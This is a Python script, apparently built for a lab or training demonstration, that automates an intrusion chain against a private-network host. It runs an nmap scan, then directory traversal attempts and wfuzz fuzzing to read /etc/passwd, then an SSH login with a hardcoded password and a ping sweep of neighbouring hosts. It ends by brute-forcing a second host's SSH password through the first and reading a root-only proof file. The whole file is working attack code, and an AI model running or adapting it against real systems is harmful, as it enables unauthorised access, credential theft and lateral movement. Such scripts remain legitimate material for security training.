import requests
import subprocess
from paramiko import SSHClient, AutoAddPolicy
from time import sleep

# IP of public web server
PUB_SERV_IP = "192.168.56.102"


def continue_prompt():
    """function that asks if we want to continue"""
    go_on = input(">>Continue (yes/no)?:\n")
    if go_on not in ["Yes", "yes"]:
        exit()


def check_open_ports():
    """function that checks for open ports via nmap"""
    print(">>Checking host for open ports\n...")
    # sleep() in code so hacker looks more human
    sleep(3)
    print(">>Result:\n")
    # using nmap for scanning open ports (SSH and HTTP in our case)
    nmap = subprocess.Popen(
        ["nmap", PUB_SERV_IP]).communicate()
    print("\n>>Found port 80, nice")


def get_request():
    """function that makes GET request to the page"""
    print("\n>>Making GET request, simulating web-interface visiting\n...")
    sleep(3)
    print(">>Result:\n")
    # here the hacker attemtps to visit a website
    resp = requests.get("http://" + PUB_SERV_IP)
    print(resp.text, "\n>>Made a GET request")


def dir_trav_attempt():
    """function that interacts with form"""
    print("\n>>Making some attempts for directory traversal\n...")
    sleep(3)
    # here the hacker tryes to input different values to form to check for traversal
    for path in ["home", ".bashrc", "../test.txt"]:
        query = "http://" + PUB_SERV_IP + "/action?path=" + path
        resp = requests.get(query)
        print(f"For {path}:" + resp.text)
    print("\n>>Made 3 attemtps")

# here he exploits the dir.trav vis wfuzz and gets /etc/passwd and /home/bob/passwd files


def dir_traversal():
    """function that exploits directory traversal"""
    for path, dic in [("../../../../../../../../etc/passwd", "dirTraversal_etc.txt"),
                      ("..//..//..//passwd", "dirTraversal.txt"), ]:
        print("\n>>Using WFUZZ util and trying to exploit directory traversal\n...")
        sleep(3)
        wfuzz = subprocess.Popen(
            ["wfuzz", "-c", "-z", "file," + dic,
             "--sc", "200", '192.168.56.102/action?path=FUZZ'],).communicate()
        print(f">>Getting file and fetching data from {path} file\n...")
        sleep(3)
        query = "http://" + PUB_SERV_IP + "/action?path=" + path
        resp = requests.get(query)
        print(resp.text)


def SSH_things():
    """function that connects to SSH, pings hosts and bruteforces password"""
    # here he connects to SSH with password he got
    print(">>Getting SSH access via password\n...")
    client = SSHClient()
    # just to add unknown server to known
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.connect("192.168.56.102", username="bob", password="jojokeklol")
    print(">>Connected to SSH\n")

    # here he checks for nearest IP's in local network via SSH
    print(">>Discovering neighbour hosts in  Bob's network\n...")
    channel = client.invoke_shell()
    # clearing output
    channel.recv(15000)
    for i in range(100, 110):
        channel.send(f"ping -c 1 192.168.56.{i}\n")
        sleep(3)
    sleep(3)
    print(channel.recv(20000).decode('utf-8'))
    continue_prompt()

    # here he attempts to bruteforce host in local network
    print(">>Trying to bruteforce 192.168.56.103 SSH password via Bob's ssh")
    with open("passwords.txt", "r") as f:
        passwords = f.readlines()
    # connecting to 192.168.56.103 SSH via Bob's ssh
    channel.send("ssh bob@192.168.56.103\n")
    sleep(1)
    print(channel.recv(1000).decode('utf-8'))
    for password in passwords:
        channel.send(password + "\n")
        sleep(5)
        output = channel.recv(1000).decode('utf-8')
        # in case of correct password
        if "Permission denied, please try again" not in output:
            break
    print(f">>The password is {password}")
    # to clear output
    channel.recv(1000)
    continue_prompt()

    # getting proof from 192.168.56.103
    channel.send("sudo cat /root/proof\n")
    sleep(1)
    channel.send(password+"\n")
    sleep(1)
    print(channel.recv(10000).decode('utf-8'))


if __name__ == "__main__":
    check_open_ports()
    continue_prompt()
    get_request()
    continue_prompt()
    dir_trav_attempt()
    continue_prompt()
    dir_traversal()
    continue_prompt()
    SSH_things()
